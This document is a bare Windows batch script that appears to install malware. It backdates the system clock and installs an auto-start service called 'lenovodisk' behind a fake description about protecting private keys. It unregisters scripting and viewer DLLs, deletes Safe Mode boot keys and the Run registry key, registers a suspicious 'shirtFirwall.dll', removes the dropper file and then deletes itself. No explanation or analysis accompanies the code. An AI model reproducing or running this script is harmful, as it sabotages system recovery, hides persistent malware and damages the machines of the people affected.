date 2004-08-17
time 19:59:58.00
ping 127.0.0.1 -n 5
sc.exe create lenovodisk BinPath= "C:\WINDOWS\system32\lenovodisk.exe" type= own type= interact start= auto DisplayName= lenovodisk
sc.exe description lenovodisk 对敏感数据(如私钥)的保护性存储，以便防止未授权的服务，过程或用户对其的非法访问。
regsvr32.exe /u /s scrrun.dll
regsvr32.exe /u /s shimgvw.dll
regsvr32.exe /u /s itss.dll
regsvr32.exe /u /s vbscript.dll
regsvr32.exe /s jscript.dll
reg.exe delete HKLM\SYSTEM\ControlSet001\Control\SafeBoot\Minimal\{4D36E967-E325-11CE-BFC1-08002BE10318} /F
reg.exe delete HKLM\SYSTEM\ControlSet001\Control\SafeBoot\Network\{4D36E967-E325-11CE-BFC1-08002BE10318} /F
reg.exe delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E967-E325-11CE-BFC1-08002BE10318} /F
reg.exe delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E967-E325-11CE-BFC1-08002BE10318} /F
reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /F
sc.exe start lenovodisk
regsvr32.exe /s C:\WINDOWS\system32\shirtFirwall.dll
regsvr32.exe /s C:\WINDOWS\system32\shirtFirwall.dll
del "C:\WINDOWS\Media\Windows XP 开始.wav"
del "C:\WINDOWS\Media\Windows XP 信息栏.wav"
del "C:\WINDOWS\Media\Windows XP 弹出窗口已阻止.wav"
ping 127.0.0.1 -n 6
del "C:\WINDOWS\lee.exe" /F
date 2008-02-03
time 11:11:08
del %0
exit